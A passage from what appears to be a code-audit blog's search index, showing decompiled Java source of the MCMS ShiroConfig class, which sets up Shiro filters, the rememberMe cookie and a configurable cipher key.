+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">//</span><br><span class="line">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="line">// (powered by FernFlower decompiler)</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">package net.mingsoft.config;</span><br><span class="line"></span><br><span class="line">import cn.hutool.core.codec.Base64;</span><br><span class="line">import java.util.LinkedHashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">import net.mingsoft.basic.realm.ManagerAuthRealm;</span><br><span class="line">import net.mingsoft.basic.strategy.ILoginStrategy;</span><br><span class="line">import net.mingsoft.basic.strategy.IModelStrategy;</span><br><span class="line">import net.mingsoft.basic.strategy.ManagerLoginStrategy;</span><br><span class="line">import net.mingsoft.basic.strategy.ManagerModelStrategy;</span><br><span class="line">import org.apache.shiro.mgt.SecurityManager;</span><br><span class="line">import org.apache.shiro.spring.security.interceptor.AuthorizationAttributeSourceAdvisor;</span><br><span class="line">import org.apache.shiro.spring.web.ShiroFilterFactoryBean;</span><br><span class="line">import org.apache.shiro.web.mgt.CookieRememberMeManager;</span><br><span class="line">import org.apache.shiro.web.mgt.DefaultWebSecurityManager;</span><br><span class="line">import org.apache.shiro.web.servlet.SimpleCookie;</span><br><span class="line">import org.springframework.aop.framework.autoproxy.DefaultAdvisorAutoProxyCreator;</span><br><span class="line">import org.springframework.beans.factory.annotation.Value;</span><br><span class="line">import org.springframework.context.annotation.Bean;</span><br><span class="line">import org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line">@Configuration</span><br><span class="line">public class ShiroConfig {</span><br><span class="line">    @Value("${ms.manager.path}")</span><br><span class="line">    private String managerPath;</span><br><span class="line">    @Value("${ms.shiro-key}")</span><br><span class="line">    private String shiroKey;</span><br><span class="line"></span><br><span class="line">    public ShiroConfig() {</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @Bean //自动代理配置</span><br><span class="line">    public DefaultAdvisorAutoProxyCreator advisorAutoProxyCreator() {</span><br><span class="line">        DefaultAdvisorAutoProxyCreator advisorAutoProxyCreator = new DefaultAdvisorAutoProxyCreator();</span><br><span class="line">        advisorAutoProxyCreator.setProxyTargetClass(true);//设置为ture</span><br><span class="line">        return advisorAutoProxyCreator;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @Bean //设置权限</span><br><span class="line">    public AuthorizationAttributeSourceAdvisor authorizationAttributeSourceAdvisor(SecurityManager securityManager) {</span><br><span class="line">        AuthorizationAttributeSourceAdvisor authorizationAttributeSourceAdvisor = new AuthorizationAttributeSourceAdvisor();</span><br><span class="line">        authorizationAttributeSourceAdvisor.setSecurityManager(securityManager);</span><br><span class="line">        return authorizationAttributeSourceAdvisor;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @Bean  //获取当前权限</span><br><span class="line">    public AuthorizationAttributeSourceAdvisor getAuthorizationAttributeSourceAdvisor(DefaultWebSecurityManager securityManager) {</span><br><span class="line">        AuthorizationAttributeSourceAdvisor advisor = new AuthorizationAttributeSourceAdvisor();</span><br><span class="line">        advisor.setSecurityManager(securityManager);</span><br><span class="line">        return advisor;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @Bean //获取当前代理</span><br><span class="line">    public DefaultAdvisorAutoProxyCreator getDefaultAdvisorAutoProxyCreator() {</span><br><span class="line">        DefaultAdvisorAutoProxyCreator autoProxyCreator = new DefaultAdvisorAutoProxyCreator();</span><br><span class="line">        autoProxyCreator.setProxyTargetClass(true);</span><br><span class="line">        return autoProxyCreator;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @Bean //设置过滤器，配置账户权限</span><br><span class="line">    public ShiroFilterFactoryBean shirFilter(SecurityManager securityManager) {</span><br><span class="line">        ShiroFilterFactoryBean shiroFilterFactoryBean = new ShiroFilterFactoryBean();</span><br><span class="line">        shiroFilterFactoryBean.setSecurityManager(securityManager);</span><br><span class="line">        shiroFilterFactoryBean.setLoginUrl(this.managerPath + "/login.do");</span><br><span class="line">        shiroFilterFactoryBean.setUnauthorizedUrl(this.managerPath + "/404.do");</span><br><span class="line">        Map&lt;String, String&gt; filterChainDefinitionMap = new LinkedHashMap();</span><br><span class="line">        filterChainDefinitionMap.put("/static/**", "anon");</span><br><span class="line">        filterChainDefinitionMap.put("/html/**", "anon");</span><br><span class="line">        filterChainDefinitionMap.put(this.managerPath + "/login.do", "anon");</span><br><span class="line">        filterChainDefinitionMap.put(this.managerPath + "/checkLogin.do", "anon");</span><br><span class="line">        filterChainDefinitionMap.put(this.managerPath + "/**", "user");</span><br><span class="line">        shiroFilterFactoryBean.setFilterChainDefinitionMap(filterChainDefinitionMap);</span><br><span class="line">        return shiroFilterFactoryBean;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @Bean //配置管理用户</span><br><span class="line">    public SecurityManager securityManager() {</span><br><span class="line">        DefaultWebSecurityManager securityManager = new DefaultWebSecurityManager();</span><br><span class="line">        securityManager.setRealm(this.customRealm());</span><br><span class="line">        securityManager.setRememberMeManager(this.rememberMeManager());</span><br><span class="line">        return securityManager;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">		//设置 cookie值 rememberMe</span><br><span class="line">    public SimpleCookie rememberMeCookie() {</span><br><span class="line">        SimpleCookie cookie = new SimpleCookie("rememberMe");</span><br><span class="line">        cookie.setMaxAge(86400);//过期时间</span><br><span class="line">        return cookie;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public CookieRememberMeManager rememberMeManager() {</span><br><span class="line">        CookieRememberMeManager cookieRememberMeManager = new CookieRememberMeManager();</span><br><span class="line">        cookieRememberMeManager.setCookie(this.rememberMeCookie());</span><br><span class="line">        cookieRememberMeManager.setCipherKey(Base64.decode(this.shiroKey));</span><br><span class="line">        return cookieRememberMeManager;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @Bean</span><br><span class="line">    public ManagerAuthRealm customRealm() {</span><br><span class="line">        return new ManagerAuthRealm();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @Bean</span><br><span class="line">    public IModelStrategy modelStrategy() {</span><br><span class="line">        return new ManagerModelStrategy();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @Bean</span><br><span class="line">    public ILoginStrategy loginStrategy() {</span><br><span class="line">        return new ManagerLoginStrategy();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
+      <tags>
+        <tag>JAVA</tag>
+      </tags>
   </entry>
 </search>
